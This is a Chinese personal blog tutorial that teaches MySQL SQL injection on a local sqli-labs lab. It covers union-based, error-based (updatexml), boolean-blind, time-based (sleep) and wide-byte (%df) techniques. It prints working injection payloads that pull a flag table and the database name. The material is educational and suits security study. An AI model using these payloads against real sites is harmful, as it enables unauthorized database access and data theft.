<script type="text/javascript" src="/js/crash_cheat.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sql注入之重新学习 | jasson个人博客</title><meta name="keywords" content="web安全,sql注入,显错注入,报错注入,盲注,宽字节注入"><meta name="author" content="jasson"><meta name="copyright" content="jasson"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基于mysql进行sql注入的全方位讲解">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入之重新学习">
<meta property="og:url" content="https://j-jasson2.github.io/2020/09/02/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="jasson个人博客">
<meta property="og:description" content="基于mysql进行sql注入的全方位讲解">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://j-jasson2.github.io/images/sql.jpeg">
<meta property="article:published_time" content="2020-09-02T02:45:41.000Z">
<meta property="article:modified_time" content="2021-08-07T16:19:37.331Z">
<meta property="article:author" content="jasson">
<meta property="article:tag" content="盲注">
<meta property="article:tag" content="SQL注入">
<meta property="article:tag" content="显错注入">
<meta property="article:tag" content="报错注入">
<meta property="article:tag" content="宽字节注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://j-jasson2.github.io/images/sql.jpeg"><link rel="shortcut icon" href="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&refer=http%3A%2F%2Finews.gtimg.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630728108&t=1576409e5f212dd7279b9a1c880c7086"><link rel="canonical" href="https://j-jasson2.github.io/2020/09/02/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%87%8D%E6%96%B0%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-left"},
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'sql注入之重新学习',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-08-08 00:19:37'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/sql.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">jasson个人博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql注入之重新学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-02T02:45:41.000Z" title="发表于 2020-09-02 10:45:41">2020-09-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-07T16:19:37.331Z" title="更新于 2021-08-08 00:19:37">2021-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql注入之重新学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><meta name="referrer" content="no-referrer"/>

<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br>在owasp top 10常年霸占榜首漏洞的位置，可以当之无愧称它为漏洞之王。SQL注入是一个通过拼接sql查询语句获取数据库里面的数据的漏洞。常见的漏洞点为url中带有的id传参，如<a target="_blank" rel="noopener" href="http://www.xxx.com/i.php?id=13">http://www.xxx.com/i.php?id=13</a>。<br>此处的13会通过php传参传到数据库进行查询，一般的查询语句为:select * from news where id=’13’。攻击者往往通过在id=13后面加入单引号闭合前面的查询内容后面加上union联合查询其他内容来获取数据。</p>
<h3 id="SQL注入的条件"><a href="#SQL注入的条件" class="headerlink" title="SQL注入的条件"></a>SQL注入的条件</h3><p>1、用户可以控制输入的数据，可以控制传参的内容。<br>2、用户传参的内容被拼接到了代码去执行。</p>
<h3 id="判断是否存在SQL注入的具体流程"><a href="#判断是否存在SQL注入的具体流程" class="headerlink" title="判断是否存在SQL注入的具体流程:"></a>判断是否存在SQL注入的具体流程:</h3><p>1、首先获取url：<a target="_blank" rel="noopener" href="http://www.xxx.com/i.php?id=1">http://www.xxx.com/i.php?id=1</a><br>2、很明显这里的13是通过get传参被放到数据库查询语句中的我们可以控制的参数。一般的查询语句为select * from test where id=’1’<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316298798-8ccfa038-d152-4f35-8958-c49444bff928.png#align=left&display=inline&height=150&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=21745&status=done&style=none&width=554" alt="image.png"><br>3、接下来在1后面加个单引号，可以看到页面报错了，因为我们的1’被当成代码执行了，当前查询语句为：Select<em>from test where id =’1’’，比正常的多了一个单引号，所以导致页面报错了。因为我的输入的东西导致了页面发生了变化，特别是这种报错了，很明显存在SQL注入漏洞。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316314777-a894da71-648e-48ed-98ef-ef2920228efe.png#align=left&display=inline&height=134&margin=%5Bobject%2Object%5D&name=image.png&originHeight=134&originWidth=554&size=30262&status=done&style=none&width=554" alt="image.png"><br>4、接下来传参为1’ and 1=1 %23，页面返回正常，与id=1的页面相同。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316319310-1a11b5b5-ce77-435e-9c0a-d6a567c92a91.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=144&originWidth=554&size=25407&status=done&style=none&width=554" alt="image.png"><br>5、更换传参为1‘ and 1=2 %23，页面不一样了，查询不了数据库内的数据，当前查询语句为：Select</em>from test where id =’1’ and 1=2 #’<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316325147-77f76770-d9d7-4e52-b710-48d496b98797.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=118&originWidth=554&size=21180&status=done&style=none&width=554" alt="image.png"><br>这里先解释一下%23，众所周知的在mysql数据库中，#是注释符，能够注释掉后面的内容，但是在url栏中，#有锚点的作用，所以说我们如果需要注释后面的单引号，需要使用url编码后的#，也就是%23。<br>在这里看到and 1=1页面返回正常，and 1=2 页面返回不正常。从渗透测试的角度判断就是代码被执行了，我们通过输出的查询语句也看到了1=1和1=2被放到查询语句查询了，因为中间的连接符是and，在1=2的时候恒为假，所以查询不出内容。两者不同，也就判断出当前存在SQL注入漏洞。</p>
<h3 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h3><h4 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h4><p>有回显数据的注入，可以通过union select联合查询将想要的数据返回到页面上的一种注入。在对于SQL注入的渗透测试过程中，我们的传参返回的内容可以在页面上输出，这种时候就可以用显错注入。接下来将详细介绍如何进行显错注入。<br>1、首先可以看到，传参id=1会输出两个数据：login name和password。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316363011-cb8e279e-0790-4dc7-8026-1d7ba13c7503.png#align=left&display=inline&height=125&margin=%5Bobject%2Object%5D&name=image.png&originHeight=250&originWidth=554&size=55928&status=done&style=none&width=277" alt="image.png"><br>2、加个单引号，页面报错了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316370623-fb91b6e8-b745-4a07-8f13-3cf7c72bf2b7.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=59302&status=done&style=none&width=277" alt="image.png"><br>3、通过后面拼接and 1=1 %23来查看代码是否成功执行，可以看到页面返回正常了，闭合成功。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316375217-57e81aec-a8a6-4bf8-b5c3-0d78bf2864eb.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=207&originWidth=554&size=27510&status=done&style=none&width=277" alt="image.png"><br>4、通过order by判断当前数据表中的字段数。通过order by 3的时候页面正常，order by 4的时候页面错误可以判断出当前字段数为3。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316379696-6ec0c84e-8418-4e32-9494-2aa3dfbfbb4a.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=551&size=29486&status=done&style=none&width=275.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316386641-3ec52df4-6f87-4a73-b058-4de7e7d52bd2.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=169&originWidth=556&size=20870&status=done&style=none&width=278" alt="image.png"><br>5、联合查询获取数据。首先将前面的1改为-1，因为在数据库查询语句中默认会输出前面查询的东西的，将1改为-1会使前面查询不到内容，那么就会输出后面union select联合查询的数据。可以看到将2和3输出出来了，这里就是我们需要的显错注入的显错点。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316391466-cb32eb81-d7d1-40c2-be47-2e100ec71492.png#align=left&display=inline&height=114&margin=%5Bobject%2Object%5D&name=image.png&originHeight=227&originWidth=554&size=25091&status=done&style=none&width=277" alt="image.png"><br>6、有了显错点，接下来只需要将要查询的代码替换2和3即可获取想要的数据下面查询flag表中的flag数据。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,flag,3 from flag %23</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316396841-2c7ec9f0-a27a-48b3-9ad8-9715de47e1d5.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=29017&status=done&style=none&width=277" alt="image.png"></p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>通过报错函数updatexml()、extractvalue()配合子查询将数据借助报错信息输出给我们的一种注入。在渗透测试过程中，经常会遇到网站因为用户的一些操作而产生代码运行错误并将错误信息返回到页面中的情况，这种时候可以通过报错注入获取数据。接下来将详细介绍如何进行报错注入。<br>1、在传参中输入单引号让页面产生错误，这里看到将报错信息返回到页面了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316496319-6b800c29-3255-48ee-ae2a-ca92277fe4bd.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&name=image.png&originHeight=164&originWidth=554&size=28491&status=done&style=none&width=277" alt="image.png"><br>2、尝试通过单引号和%23注释来进行闭合发现闭合错误，这时候就需要考虑，是否当前页面的传参本身没有单引号，不需要闭合。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316499725-53ea45fc-d881-4eca-921b-b7d961e7afb2.png#align=left&display=inline&height=88&margin=%5Bobject%2Object%5D&name=image.png&originHeight=175&originWidth=554&size=30016&status=done&style=none&width=277" alt="image.png"><br>3、删除单引号与%23，发现页面正常了，说明这里为int类型的传参，不需要单引号闭合。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316504397-5e9319dd-d6dc-4647-a85e-26b188524505.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=26175&status=done&style=none&width=277" alt="image.png"><br>4、使用报错函数updataxml()查询当前数据库库名。payload如下：<br>?id=1 and updatexml(1,concat(0x7e,(select database())),1)<br>这里updatexml的语法为后面跟上3个数据，我们在第二个数据中拼接0x7e和子查询(select database())来获取数据。这里0x7e为十六进制的~，用来使函数报错的，没有实际意义。子查询即在括号中的查询语句，与数学中一样，括号中的东西先执行。所以这里的流程为先子查询获取了数据，然后拼接波浪线报错，输出到页面中。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316508649-186ae432-4135-45af-8370-2e0fc3b94bf2.png#align=left&display=inline&height=93&margin=%5Bobject%2Object%5D&name=image.png&originHeight=185&originWidth=554&size=20405&status=done&style=none&width=277" alt="image.png"><br>5、获取flag表中的数据。<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-2/?id=1</a> and updatexml(1,concat(0x7e,(select flag from flag)),1)<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316512988-f6e5a40c-b74e-419d-be49-cd685253756a.png#align=left&display=inline&height=75&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=23007&status=done&style=none&width=277" alt="image.png"><br>6、因为报错函数输出的东西有长度限制，所以对于这种数据长度值超过的数据，我们需要通过截取函数substring()来获得。<br>获取第一个字符开始的20个数据：<br>?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),1,20)),1)<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316517210-28964bb5-8a4e-44d1-bc99-5a5bbad1eee9.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=23621&status=done&style=none&width=277" alt="image.png"><br>获取第21个字符开始的20个数据，（不足20个则显示剩下的数据）：<br>?id=1 and updatexml(1,concat(0x7e,substring((select flag from flag),21,20)),1)<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316521329-2c232ccc-5430-4284-ab38-335b355f6316.png#align=left&display=inline&height=94&margin=%5Bobject%2Object%5D&name=image.png&originHeight=188&originWidth=554&size=21660&status=done&style=none&width=277" alt="image.png"></p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>对于SQL注入的测试过程中存在这样的情况，输入的传参只会返回是否有数据而不会将查询的东西输出到页面上，然后不显示错误页面，这种时候就要尝试盲注来获取数据。盲注又分为布尔盲注和延时盲注。</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：<br>1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316537064-402e041f-a4e4-4fd1-9cb4-16013920503e.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=20549&status=done&style=none&width=277" alt="image.png"><br>2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316541341-930c7ffa-7210-4f74-8b39-8237df940d48.png#align=left&display=inline&height=110&margin=%5Bobject%2Object%5D&name=image.png&originHeight=220&originWidth=554&size=19624&status=done&style=none&width=277" alt="image.png"><br>3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316545416-9133ab8b-c70f-421d-b7ad-d1cb876f11e0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&name=image.png&originHeight=203&originWidth=554&size=19835&status=done&style=none&width=277" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316549309-b0d686cf-f662-490a-89b3-fdcfe1722712.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=208&originWidth=554&size=19652&status=done&style=none&width=277" alt="image.png"><br>4、通过length()函数判断数据库库名的长度大于1。<br>?id=1’ and length(database())&gt;1 %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316553774-792e2acb-2d05-4197-9c29-bb4345492ad1.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=193&originWidth=554&size=19558&status=done&style=none&width=277" alt="image.png"><br>5、在大于8的时候页面返回空，所以数据库库名长度等于8。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316557258-2afe4840-2c0c-4193-9f1d-f3065f5cc6c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=16991&status=done&style=none&width=277" alt="image.png"><br>6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码<br>?id=1’ and ascii(substr((select database()),1,1))&gt;97 %23<br>?id=1’ and ascii(substr((select database()),1,1))=101 %23<br>首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316561360-9e4bca64-de7b-4610-8b86-14ae35a9298d.png#align=left&display=inline&height=99&margin=%5Bobject%2Object%5D&name=image.png&originHeight=197&originWidth=554&size=20301&status=done&style=none&width=277" alt="image.png"><br>7、更改截取的位置，判断后面的字符对应的ascii码值。<br>?id=1’ and ascii(substr((select database()),2,1))=101 %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316565188-122d2ff2-501a-43e1-b1fb-bef02524ff60.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=554&size=19995&status=done&style=none&width=277" alt="image.png"></p>
<h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。<br>1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316574305-a750e1da-86b1-452c-ad5e-dc2d2916fb80.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=195&originWidth=554&size=19760&status=done&style=none&width=554" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316578704-29275196-b0bf-4a49-896e-acfa907a811f.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=205&originWidth=554&size=20224&status=done&style=none&width=554" alt="image.png"><br>2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4._秒；使用sleep(5)延时5秒之后，页面响应时间为9._秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316631400-e6e26c83-57e3-4745-8bdf-b41f34d87222.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=68367&status=done&style=none&width=277" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316634717-9fb75a2d-6415-4b77-a5e1-551fef19d90a.png#align=left&display=inline&height=77&margin=%5Bobject%2Object%5D&name=image.png&originHeight=154&originWidth=554&size=62202&status=done&style=none&width=277" alt="image.png"><br>3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。<br>?id=2’ and if((length(database())=8),sleep(5),1) %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316640888-0a021ca3-416e-49b5-a2ae-b58b989f0403.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=222&originWidth=554&size=81658&status=done&style=none&width=277" alt="image.png"><br>4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。<br>?id=2’ and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316644693-f9bed0ca-cd60-486b-85e5-24dc016a547e.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=79429&status=done&style=none&width=277" alt="image.png"><br>5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316649328-e68000df-34d7-4dfb-b2fe-88d147b1ae3f.png#align=left&display=inline&height=382&margin=%5Bobject%2Object%5D&name=image.png&originHeight=382&originWidth=533&size=28250&status=done&style=none&width=533" alt="image.png"></p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>为了防止sql注入，在网站配置上会开启魔术引号。当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。也就是说，在我们输入’（单引号）或者”（双引号）进行闭合的时候，程序会自动在前面加上\（反斜线），将其转义成字符串，也就是失去了本来的用法，变成了字符串输入，无法进行闭合，即不能使输入的代码正常执行。<br>在mysql中，用于转义的函数有addslashes()，mysql_real_escape_string()，mysql_escape_string()等。</p>
<h4 id="宽字节注入具体解析过程"><a href="#宽字节注入具体解析过程" class="headerlink" title="宽字节注入具体解析过程:"></a>宽字节注入具体解析过程:</h4><p>1、在id传参后面加上%df和单引号<br>2、$_GET[‘id’] 经过 addslashes编码之后带入了‘\’，即?id=1%df\’ and 1=1 %23<br>url编码为：?id=1%df%5C%27%20and%201%3D1%20%23<br>3、PHP将处理好的数据带入mysql处理时使用了gbk编码<br>4、%df%5c 编码后为“運” 成功的吃掉了%5c，也就是\（反斜线）<br>5、处理后的查询数据为?id=1運’ and 1=1 %23，单引号成功闭合</p>
